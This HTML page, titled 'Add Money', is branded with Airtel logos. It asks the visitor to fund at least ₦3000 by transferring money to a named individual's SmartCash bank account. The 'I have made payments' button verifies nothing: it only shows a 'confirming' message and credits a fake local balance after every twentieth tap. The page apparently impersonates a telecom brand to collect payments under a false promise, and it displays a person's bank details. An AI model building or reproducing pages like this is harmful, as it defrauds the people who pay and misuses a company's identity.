<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Add Money</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fff;
      overflow-x: hidden;
    }

    .background-animation {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.8);
      overflow: hidden;
      z-index: -1;
    }

    .airtel-piece {
      position: absolute;
      width: 20px;
      height: 20px;
      background-image: url("airtel.png"); /* <- Use small Airtel logo */
      background-size: cover;
      animation: float 15s infinite;
      opacity: 0.2;
    }

    @keyframes float {
      0% {
        transform: translateY(100vh) rotate(0deg);
        opacity: 0;
      }
      50% {
        opacity: 0.3;
      }
      100% {
        transform: translateY(-100vh) rotate(360deg);
        opacity: 0;
      }
    }

    .container {
      padding: 20px;
      text-align: center;
    }

    .logo {
      width: 80px;
      margin: 10px auto;
      display: block;
    }

    .input-section,
    .account-section {
      background: #fff;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      max-width: 400px;
      margin: 20px auto;
    }

    input {
      padding: 12px;
      width: 80%;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 8px;
    }

    button {
      padding: 12px 24px;
      margin-top: 15px;
      font-size: 16px;
      background-color: red;
      color: #fff;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    .popup {
      background-color: #fff3f3;
      color: red;
      padding: 10px;
      margin-top: 10px;
      border-radius: 8px;
      display: none;
    }

    .account-section {
      display: none;
    }

    .details {
      font-size: 18px;
      font-weight: bold;
      margin: 10px 0;
    }

    .back-btn {
      margin-top: 30px;
      display: block;
      text-align: center;
    }

    .back-btn a {
      color: blue;
      text-decoration: underline;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="background-animation" id="bg">
    <!-- Airtel logo particles -->
    <script>
      for (let i = 0; i < 50; i++) {
        const logo = document.createElement('div');
        logo.className = 'airtel-piece';
        logo.style.left = `${Math.random() * 100}%`;
        logo.style.top = `${Math.random() * 100}%`;
        logo.style.animationDuration = `${10 + Math.random() * 10}s`;
        document.getElementById('bg').appendChild(logo);
      }
    </script>
  </div>

  <div class="container">
    <img src="airtel.png" class="logo" alt="Airtel Logo" />

    <div class="input-section" id="inputSection">
      <h3>Enter Amount to Fund</h3>
      <input type="number" id="amount" placeholder="Minimum ₦3000" />
      <button onclick="validateAmount()">Continue</button>
      <div class="popup" id="popup">Please enter minimum of ₦3000</div>
    </div>

    <div class="account-section" id="accountSection">
      <img src="airtel.png" class="logo" alt="Airtel Logo" />
      <div class="details">Name: EMMANUEL OKWUNNA</div>
      <div class="details">Bank: SmartCash Payment Service Bank</div>
      <div class="details">Account Number: 812 489 0070</div>
      <button onclick="confirmPayment()">I have made payments</button>
      <div class="popup" id="confirmMsg">Thank you. We are confirming your transaction...</div>
    </div>

    <div class="back-btn">
      <a href="dashboard.html">← Back to Dashboard</a>
    </div>
  </div>

  <script>
    const popup = document.getElementById("popup");
    const inputSection = document.getElementById("inputSection");
    const accountSection = document.getElementById("accountSection");
    const confirmMsg = document.getElementById("confirmMsg");

    let tapCount = parseInt(localStorage.getItem("tapCount") || "0");
    let balance = parseInt(localStorage.getItem("balance") || "0");

    function validateAmount() {
      const amount = document.getElementById("amount").value;
      if (amount >= 3000) {
        popup.style.display = "none";
        inputSection.style.display = "none";
        accountSection.style.display = "block";
      } else {
        popup.style.display = "block";
      }
    }

    function confirmPayment() {
      tapCount++;
      localStorage.setItem("tapCount", tapCount);

      confirmMsg.style.display = "block";

      if (tapCount % 20 === 0) {
        balance += 3000;
        localStorage.setItem("balance", balance);
      }

      setTimeout(() => {
        confirmMsg.style.display = "none";
      }, 3000);
    }
  </script>
</body>
  </html>
